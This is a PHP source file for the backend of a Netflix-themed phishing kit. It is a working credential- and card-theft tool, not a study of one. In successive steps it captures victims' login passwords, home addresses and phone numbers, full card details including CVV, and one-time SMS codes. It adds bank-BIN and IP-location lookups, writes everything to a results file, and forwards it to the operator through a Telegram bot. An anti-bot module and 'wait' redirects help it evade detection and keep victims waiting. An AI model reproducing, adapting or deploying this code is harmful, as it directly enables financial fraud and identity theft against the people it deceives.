<?php 
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}
require_once 'config.php';
require_once __DIR__ . '/lib/user_panel.php';
require_once 'botMother/botMother.php';

$bm = new botMother();

// Enhanced emoji constants for consistency
const EMOJIS = [
    'card' => '💳',
    'user' => '👤', 
    'bank' => '🏦',
    'flag' => '🌍',
    'ip' => '🌐',
    'loc' => '📍',
    'phone' => '📱',
    'lock' => '🔒',
    'calendar' => '📅',
    'shield' => '🛡️',
    'check' => '✅',
    'warning' => '⚠️',
    'error' => '❌',
    'star' => '⭐',
    'fire' => '🔥',
    'netflix' => '📺'
];

function getBinData($cc) {
    $bin = substr(preg_replace('/\D/', '', $cc), 0, 8);
    $url = "https://lookup.binlist.net/$bin";
    $context = stream_context_create([
        'http' => [
            'timeout' => 10,
            'method' => 'GET',
            'header' => 'User-Agent: Mozilla/5.0'
        ]
    ]);
    $resp = @file_get_contents($url, false, $context);
    return $resp ? json_decode($resp, true) : null;
}

function getIpData($ip) {
    $url = "http://ip-api.com/json/$ip?fields=status,message,country,regionName,city,isp,org,as,query";
    $context = stream_context_create([
        'http' => [
            'timeout' => 10,
            'method' => 'GET',
            'header' => 'User-Agent: Mozilla/5.0'
        ]
    ]);
    $resp = @file_get_contents($url, false, $context);
    return $resp ? json_decode($resp, true) : null;
}

function sendTotelegram($data){
    global $bot, $chat_id;
    $data = urlencode($data);
    $api = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$chat_id&text=$data&parse_mode=HTML";
    $c = curl_init($api);
    curl_setopt_array($c, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_TIMEOUT => 15,
        CURLOPT_CONNECTTIMEOUT => 10,
        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    ]);
    $res = curl_exec($c);
    curl_close($c);
    return $res;
}

function formatIpInfo($ipInfo, $ip) {
    if (!$ipInfo || $ipInfo['status'] !== 'success') {
        return EMOJIS['ip'] . " IP: $ip";
    }
    return EMOJIS['ip'] . " IP: $ip\n"
         . EMOJIS['loc'] . " Location: {$ipInfo['country']} - {$ipInfo['regionName']} - {$ipInfo['city']}\n"
         . "📶 ISP: {$ipInfo['isp']}\n"
         . "📡 ASN: {$ipInfo['as']}";
}

function sendAndLog(string $label, string $message, string $user = '') {
    $timestamp = date('Y-m-d H:i:s');
    $entry = EMOJIS['star'] . " [$timestamp] $label\n$message\n" . str_repeat('─', 50) . "\n\n";
    file_put_contents(__DIR__ . '/results.txt', $entry, FILE_APPEND | LOCK_EX);
    sendTotelegram(EMOJIS['netflix'] . " NETFLIX - $label\n\n$message");
    panelTouchUser($user, $label);
}

function isAjaxRequest() {
    return isset($_SERVER['HTTP_X_REQUESTED_WITH']) && 
           strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest';
}

function respondLoginError($message) {
    if (isAjaxRequest()) {
        header('Content-Type: application/json');
        echo json_encode([
            'success' => false, 
            'error' => EMOJIS['error'] . " $message"
        ]);
    } else {
        echo EMOJIS['error'] . " $message";
    }
    exit;
}

function respondSuccess($redirect, $message = '') {
    if (isAjaxRequest()) {
        header('Content-Type: application/json');
        echo json_encode([
            'success' => true, 
            'message' => $message,
            'redirect' => $redirect
        ]);
    } else {
        if ($message) echo EMOJIS['check'] . " $message<br>";
        header("Location: $redirect");
    }
    exit;
}

$ip = $_SERVER['REMOTE_ADDR'];
$ipInfo = getIpData($ip);

// 🔥 Step 1: LOGIN 🚀
if(isset($_POST['user'])){
    $captchaResponse = $_POST['h-captcha-response'] ?? '';
    $captchaSecret = "ES_c2e6eff9a7644bae93f860ec1e530f92";

    if (empty($captchaResponse)) {
        respondLoginError("Captcha not completed");
    }

    $verifyCaptcha = curl_init();
    curl_setopt_array($verifyCaptcha, [
        CURLOPT_URL => "https://hcaptcha.com/siteverify",
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query([
            'secret' => $captchaSecret,
            'response' => $captchaResponse,
        ]),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 15
    ]);
    $responseData = json_decode(curl_exec($verifyCaptcha));
    curl_close($verifyCaptcha);

    if (!$responseData || !$responseData->success) {
        respondLoginError("Invalid captcha");
    }

    $_SESSION['_login_user'] = $_POST['user'];
    $msg = EMOJIS['user'] . " Username: {$_POST['user']}\n"
         . "🔑 Password: {$_POST['pass']}\n"
         . formatIpInfo($ipInfo, $ip);

    sendAndLog("🔐 Login Submitted", $msg, $_POST['user']);
    respondSuccess('adrees.php', 'Login successful!');
}

// 🔥 Step 2: ADDRESS 📍
if(isset($_POST['first-name'])) {
    $_SESSION['_first-name'] = $_POST['first-name'];
    $_SESSION['_last-name'] = $_POST['last-name'] ?? '';
    $fullName = trim("{$_POST['first-name']} {$_POST['last-name']}");

    $msg = EMOJIS['user'] . " Full Name: $fullName\n"
         . "👤 First Name: {$_POST['first-name']}\n"
         . "👤 Last Name: {$_POST['last-name']}\n"
         . "🏠 Address 1: {$_POST['address-line-1']}\n"
         . "🏠 Address 2: {$_POST['address-line-2']}\n"
         . EMOJIS['phone'] . " Phone: {$_POST['phoneNumber']}\n"
         . "🌍 Country: {$_POST['country']}\n"
         . "🏙️ City: {$_POST['city']}\n"
         . "🗺️ State: {$_POST['state']}\n"
         . "📮 Postal: {$_POST['postal-code']}\n"
         . formatIpInfo($ipInfo, $ip);

    sendAndLog("📍 Address Submitted", $msg, $fullName ?: $_SESSION['_login_user']);
    respondSuccess('card.php');
}

// 🔥 Step 3: CARD 💳
if(isset($_POST['cc'])) {
    $_SESSION['_cc'] = $_POST['cc'];
    $cardHolder = $_POST['holder-name'] ?? '';
    $cc = $_POST['cc'];
    $binInfo = getBinData($cc);

    $msg = EMOJIS['netflix'] . " 🔥 NEW CARD SUBMISSION 🔥\n"
         . str_repeat('─', 35) . "\n"
         . EMOJIS['user'] . " Holder: " . ($cardHolder ?: 'N/A') . "\n"
         . EMOJIS['card'] . " Card: $cc\n"
         . EMOJIS['calendar'] . " Exp: {$_POST['exp']}\n"
         . EMOJIS['lock'] . " CVV: {$_POST['cvv']}\n";

    if ($binInfo) {
        $msg .= "\n" . EMOJIS['bank'] . " Bank: " . ($binInfo['bank']['name'] ?? 'N/A') . "\n"
              . "🏷️ Brand: " . ($binInfo['brand'] ?? 'N/A') . "\n"
              . "💰 Type: " . ($binInfo['scheme'] ?? 'N/A') . " (" . ($binInfo['type'] ?? 'N/A') . ")\n"
              . "🌍 Country: " . ($binInfo['country']['name'] ?? 'N/A') 
              . ($binInfo['country']['emoji'] ?? EMOJIS['flag']);
    }

    $msg .= "\n\n" . formatIpInfo($ipInfo, $ip) . "\n"
          . str_repeat('─', 35);

    sendAndLog("💳 Card Submitted", $msg, $cardHolder ?: $_SESSION['_login_user']);
    respondSuccess('wait.php?next=sms.php');
}

// 🔥 Step 4: OTP 🔑
if(isset($_POST['otp'])) {
    $msg = EMOJIS['card'] . " Card: {$_SESSION['_cc']}\n"
         . "🔑 OTP Code: {$_POST['otp']}\n"
         . formatIpInfo($ipInfo, $ip);

    sendAndLog("🔓 OTP Submitted", $msg, $_SESSION['_login_user'] ?? '');

    if(isset($_POST['exit'])){
        respondSuccess('exit.php', 'Thank you!');
    }

    respondSuccess('wait.php?next=sms.php');
}
?>
